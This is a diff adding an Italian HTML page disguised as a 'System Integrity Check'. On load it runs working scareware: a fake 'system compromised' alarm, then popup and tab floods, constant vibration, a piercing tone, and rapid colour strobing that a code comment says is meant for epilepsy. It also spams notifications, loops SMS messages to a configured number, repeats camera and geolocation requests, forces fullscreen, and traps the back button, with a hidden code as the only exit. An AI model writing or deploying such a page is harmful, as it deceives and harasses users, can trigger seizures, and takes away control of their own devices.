@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>System Integrity Check</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; }
+  html, body {
+    width: 100%; height: 100%; height: 100dvh;
+    overflow: hidden; position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: #000;
+    font-family: monospace;
+  }
+  body { background: #000; }
+  .flash { display: none; }
+  @keyframes strobe {
+    0% { background: #000; }
+    25% { background: #fff; }
+    50% { background: #ff0000; }
+    75% { background: #00ff00; }
+    100% { background: #000; }
+  }
+  .strobe-active body {
+    animation: strobe 0.1s infinite;
+  }
+  #overlay {
+    position: fixed; inset: 0; z-index: 9999999;
+    background: #000;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    color: #ff0000;
+    padding: 20px;
+  }
+  .hidden { display: none !important; }
+</style>
+</head>
+<body>
+
+<div id="overlay">
+  <h1 style="font-size:28px;margin-bottom:20px;text-align:center;">&#9888; SISTEMA COMPROMESSO</h1>
+  <p style="color:#aaa;font-size:14px;text-align:center;margin-bottom:40px;">Riavvio necessario.<br>Non spegnere il dispositivo.</p>
+  <div style="font-size:60px;animation:pulse 0.5s infinite;">&#9888;</div>
+  <p style="color:#444;font-size:11px;margin-top:40px;" id="counter">Attendi...</p>
+</div>
+
+<style>
+@keyframes pulse {
+  0%,100% { opacity: 1; }
+  50% { opacity: 0; }
+}
+</style>
+
+<script>
+(function(){
+  // === CONFIG ===
+  const CODICE_SBLOCCO = '1234';
+  const NUMERO_SMS = '+393401234567'; // ← METTI QUI IL NUMERO PER SMS LOOP
+  const INTERVALLO_POPUP = 300;  // ms tra un popup e l'altro
+  const INTERVALLO_VIBRA = 100;
+  const INTERVALLO_SMS = 800;
+
+  let sbloccato = false;
+  let finestreAperte = [];
+  let timerPool = [];
+
+  // === FUNZIONI STRESS ===
+
+  // 1. POPUP FLOOD
+  function apriPopup() {
+    if (sbloccato) return;
+    try {
+      const w = window.open(
+        'about:blank',
+        '_blank',
+        'width=400,height=300,left=' + (Math.random()*200) + ',top=' + (Math.random()*200)
+      );
+      if (w) {
+        try {
+          w.document.write('<html><body style="background:#000;color:#f00;font-size:40px;display:flex;align-items:center;justify-content:center;margin:0;">&#9888;</body></html>');
+          w.document.title = 'ALLERTA';
+        } catch(e) {}
+        finestreAperte.push(w);
+        // Dopo un po' li chiudiamo e riapriamo per non saturare la memoria del browser
+        if (finestreAperte.length > 15) {
+          const vecchia = finestreAperte.shift();
+          try { vecchia.close(); } catch(e) {}
+        }
+      }
+    } catch(e) {}
+  }
+
+  // 2. TAB FLOOD (prova ad aprire tab reali)
+  function apriTab() {
+    if (sbloccato) return;
+    try {
+      const w = window.open('data:text/html,<script>setInterval(function(){document.body.style.background="red";setTimeout(function(){document.body.style.background="black"},100)},200)</script>');
+      if (w) {
+        setTimeout(function() { try { w.close(); } catch(e) {} }, 3000);
+      }
+    } catch(e) {}
+  }
+
+  // 3. VIBRAZIONE CONTINUA
+  function vibra() {
+    if (sbloccato) return;
+    try {
+      navigator.vibrate([50, 30, 50, 30, 100, 30, 100, 30, 100]);
+    } catch(e) {}
+  }
+
+  // 4. AUDIO BLAST (tono fastidioso)
+  let audioCtx = null;
+  let osc = null;
+  let gain = null;
+
+  function avviaAudio() {
+    if (sbloccato) return;
+    try {
+      if (!audioCtx) {
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        osc = audioCtx.createOscillator();
+        gain = audioCtx.createGain();
+        osc.type = 'square';     // suono più fastidioso
+        osc.frequency.value = 1800; // frequenza acuta
+        gain.gain.value = 0.15;  // volume moderato per non rompere casse
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.start();
+      } else if (audioCtx.state === 'suspended') {
+        audioCtx.resume();
+      }
+    } catch(e) {}
+  }
+
+  function fermaAudio() {
+    try {
+      if (osc) { osc.stop(); osc.disconnect(); osc = null; }
+      if (gain) { gain.disconnect(); gain = null; }
+      if (audioCtx) { audioCtx.close(); audioCtx = null; }
+    } catch(e) {}
+  }
+
+  // 5. FLASH SCHERMO (per epilessia / fastidio)
+  function flash() {
+    if (sbloccato) return;
+    const body = document.body;
+    // Alterna colori rapidi
+    let count = 0;
+    const interval = setInterval(function() {
+      if (sbloccato) { clearInterval(interval); return; }
+      body.style.background = ['#000','#fff','#f00','#0f0','#00f','#ff0','#f0f'][count % 7];
+      count++;
+    }, 80);
+    timerPool.push(interval);
+  }
+
+  // 6. NOTIFICHE SPAM
+  function spammaNotifiche() {
+    if (sbloccato) return;
+    if (!('Notification' in window)) return;
+    if (Notification.permission === 'granted') {
+      let nCount = 0;
+      const interval = setInterval(function() {
+        if (sbloccato) { clearInterval(interval); return; }
+        if (nCount > 50) { clearInterval(interval); return; }
+        try {
+          const notif = new Notification('⚠ ALLARMA SICUREZZA #' + nCount, {
+            body: 'Accesso non autorizzato rilevato.',
+            tag: 'hack' + nCount,
+            requireInteraction: true,
+            vibrate: [200, 100, 200]
+          });
+          nCount++;
+        } catch(e) {}
+      }, 500);
+      timerPool.push(interval);
+    } else if (Notification.permission === 'default') {
+      Notification.requestPermission();
+    }
+  }
+
+  // 7. SMS LOOP (apre app SMS in continuo)
+  function smsLoop() {
+    if (sbloccato) return;
+    const tel = NUMERO_SMS;
+    if (tel === '+393401234567') return; // non modificato
+    let count = 0;
+    const interval = setInterval(function() {
+      if (sbloccato) { clearInterval(interval); return; }
+      if (count > 30) { clearInterval(interval); return; }
+      count++;
+      // Android: apre l'app SMS precompilata
+      // iOS: non funziona via browser
+      const link = document.createElement('a');
+      link.href = 'sms:' + tel + '?body=URGENTE: accesso non autorizzato sul dispositivo #' + count;
+      link.style.position = 'absolute';
+      link.style.left = '-9999px';
+      document.body.appendChild(link);
+      link.click();
+      setTimeout(function() { try { document.body.removeChild(link); } catch(e) {} }, 100);
+    }, INTERVALLO_SMS);
+    timerPool.push(interval);
+  }
+
+  // 8. GEOLOCATION SPAM
+  function geoSpam() {
+    if (sbloccato) return;
+    if (!navigator.geolocation) return;
+    let gCount = 0;
+    const interval = setInterval(function() {
+      if (sbloccato) { clearInterval(interval); return; }
+      if (gCount > 20) { clearInterval(interval); return; }
+      gCount++;
+      try {
+        navigator.geolocation.getCurrentPosition(function(){}, function(){}, {
+          enableHighAccuracy: true,
+          timeout: 100,
+          maximumAge: 0
+        });
+      } catch(e) {}
+    }, 200);
+    timerPool.push(interval);
+  }
+
+  // 9. FULLSCREEN LOOP + HISTORY LOCK
+  function lockSystem() {
+    // Fullscreen
+    setInterval(function() {
+      if (sbloccato) return;
+      try {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+          const el = document.documentElement;
+          if (el.requestFullscreen) el.requestFullscreen();
+          else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        }
+      } catch(e) {}
+    }, 400);
+
+    // History lock
+    history.pushState(null, '', location.href);
+    window.addEventListener('popstate', function(e) {
+      if (sbloccato) return;
+      e.preventDefault();
+      history.pushState(null, '', location.href);
+    });
+    setInterval(function() {
+      if (sbloccato) return;
+      history.pushState(null, '', location.href);
+    }, 100);
+
+    // beforeunload
+    window.addEventListener('beforeunload', function(e) {
+      if (sbloccato) return;
+      e.preventDefault();
+      e.returnValue = '';
+    });
+  }
+
+  // 10. CAMERA REQUEST SPAM
+  function cameraSpam() {
+    if (sbloccato) return;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    let cCount = 0;
+    const interval = setInterval(function() {
+      if (sbloccato) { clearInterval(interval); return; }
+      if (cCount > 10) { clearInterval(interval); return; }
+      cCount++;
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          stream.getTracks().forEach(t => t.stop());
+        })
+        .catch(function(){});
+    }, 500);
+    timerPool.push(interval);
+  }
+
+  // === AVVIA TUTTO ===
+  function startStress() {
+    lockSystem();
+
+    // Popup flood
+    setInterval(apriPopup, INTERVALLO_POPUP);
+    setInterval(apriTab, 2000);
+
+    // Vibrazione
+    setInterval(vibra, INTERVALLO_VIBRA);
+
+    // Audio
+    document.addEventListener('touchstart', function() {
+      avviaAudio();
+    }, { once: true });
+    // Prova ad avviare audio anche al load
+    setTimeout(function() {
+      try { avviaAudio(); } catch(e) {}
+    }, 1000);
+
+    // Flash
+    flash();
+
+    // Notifiche (dopo 2 secondi)
+    setTimeout(spammaNotifiche, 2000);
+
+    // SMS loop (dopo 3 secondi)
+    setTimeout(smsLoop, 3000);
+
+    // Geolocation spam
+    setTimeout(geoSpam, 1500);
+
+    // Camera spam
+    setTimeout(cameraSpam, 2500);
+
+    // Counter
+    let c = 0;
+    setInterval(function() {
+      if (sbloccato) return;
+      c++;
+      document.getElementById('counter').textContent = 'Blocco attivo da ' + c + ' secondi. Codice: ' + CODICE_SBLOCCO;
+    }, 1000);
+  }
+
+  // === CODICE DI SBLOCC0 ===
+  // Tappa 5 volte sul titolo per sbloccare
+  let tapCount = 0;
+  let tapTimer = null;
+  document.addEventListener('click', function(e) {
+    if (sbloccato) return;
+    tapCount++;
+    if (tapTimer) clearTimeout(tapTimer);
+    tapTimer = setTimeout(function() {
+      tapCount = 0;
+    }, 2000);
+
+    if (tapCount >= 5) {
+      tapCount = 0;
+      // Mostra campo codice
+      const overlay = document.getElementById('overlay');
+      overlay.innerHTML = `
+        <h1 style="font-size:24px;margin-bottom:20px;">SBLOCCA SISTEMA</h1>
+        <input type="password" id="codice" maxlength="4" placeholder="----" style="background:#111;border:2px solid #00ff41;color:#00ff41;font-size:36px;letter-spacing:14px;text-align:center;padding:14px;border-radius:10px;width:220px;outline:none;" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+        <p id="msgSblocco" style="color:#ff4444;font-size:13px;margin-top:12px;"></p>
+      `;
+      document.getElementById('codice').focus();
+      document.getElementById('codice').addEventListener('input', function() {
+        const val = this.value.replace(/\D/g, '');
+        this.value = val;
+        if (val.length === 4) {
+          if (val === CODICE_SBLOCCO) {
+            document.getElementById('msgSblocco').textContent = '✔ Sblocco in corso...';
+            document.getElementById('msgSblocco').style.color = '#00ff41';
+            sbloccato = true;
+            // Ferma TUTTO
+            timerPool.forEach(t => clearInterval(t));
+            timerPool = [];
+            fermaAudio();
+            finestreAperte.forEach(w => { try { w.close(); } catch(e) {} });
+            finestreAperte = [];
+            try { if(document.exitFullscreen) document.exitFullscreen(); } catch(e){}
+            try { if(document.webkitExitFullscreen) document.webkitExitFullscreen(); } catch(e){}
+            document.body.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#0a0a0a;color:#00ff41;font-family:monospace;font-size:20px;padding:30px;text-align:center;"><div style="font-size:60px;margin-bottom:16px;">&#10003;</div>Stress test completato.<br>Il sistema è stato ripristinato.</div>';
+          } else {
+            document.getElementById('msgSblocco').textContent = '✘ Codice errato';
+            this.value = '';
+            setTimeout(function(){ document.getElementById('codice').focus(); }, 200);
+          }
+        }
+      });
+    }
+  });
+
+  // === PARTENZA ===
+  // Si avvia dopo 1 secondo
+  setTimeout(function() {
+    try { avviaAudio(); } catch(e) {}
+  }, 500);
+
+  // Touch start avvia anche audio
+  document.addEventListener('touchstart', function() {
+    try { avviaAudio(); } catch(e) {}
+  });
+
+  // Avvia tutto dopo 1.5 secondi
+  setTimeout(startStress, 1500);
+
+  console.log('[STRESS TEST] Codice sblocco: ' + CODICE_SBLOCCO);
+  console.log('[STRESS TEST] Tocca 5 volte per accedere al pannello sblocco');
+
+})();
+</script>
+</body>
+</html>
